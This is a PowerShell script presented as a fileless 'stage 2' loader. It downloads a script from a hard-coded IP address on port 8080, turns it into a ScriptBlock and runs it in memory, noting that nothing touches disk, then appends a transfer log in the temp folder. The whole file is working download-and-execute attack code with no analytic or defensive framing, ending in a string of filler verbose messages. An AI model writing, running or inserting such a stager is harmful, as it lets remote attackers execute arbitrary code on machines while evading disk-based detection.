<#
.SYNOPSIS
    Endpoint-driven in-memory script loader.

.DESCRIPTION
    Resolves the configured endpoint, downloads the stage 2 text
    with a bounded timeout, checks the returned length and then
    executes the script block in the current session.

.NOTES
    No script content is written to disk.
#>
$Stage2Url = 'http://203.0.113.166:8080/stage2.ps1'
$StageLog = "$env:TEMP\transfer.log"
$RequestTimeout = 111
$ErrorActionPreference = "Stop"

# Text retrieval
function Get-StageScriptText {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [int]$TimeoutSec = 111
    )

    Write-Verbose ("Fetching script text from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    return $ClientObject.DownloadString($SourceUrl)
}

# In-memory execution
function Invoke-Stage2Script {
    param(
        [string]$ScriptBody = ''
    )

    if ([string]::IsNullOrWhiteSpace($ScriptBody)) {
        throw "Stage 2 script body is empty"
    }
    Write-Verbose ("Script length: " + $ScriptBody.Length)
    $ScriptBlock = [ScriptBlock]::Create($ScriptBody)
    return $ScriptBlock.Invoke()
}

try {
    Write-Verbose "Starting in-memory stage"
    $StageScript = Get-StageScriptText -SourceUrl $Stage2Url -TimeoutSec $RequestTimeout
    $FetchResult = Invoke-Stage2Script -ScriptBody $StageScript
    Write-Verbose "Stage result: $($FetchResult)"
}
catch {
    Write-Warning "In-memory loader failed: $($_.Exception.Message)"
}

$LoadReport = [ordered]@{
    Stage = "memory"
    Endpoint = $Stage2Url
    ScriptLength = $StageScript.Length
}
$LoadReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $StageLog -Append
Write-Verbose "Collecting host metadata"
Write-Verbose "Retry budget remaining"
Write-Verbose "Validating result"
Write-Verbose "Applying operation timeout"
Write-Verbose "Checking local path"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Resolving configured target"
Write-Verbose "Stage handoff finished"
Write-Verbose "Exporting operation report"
Write-Verbose "Starting workflow"
Set-Location -Path $env:TEMP
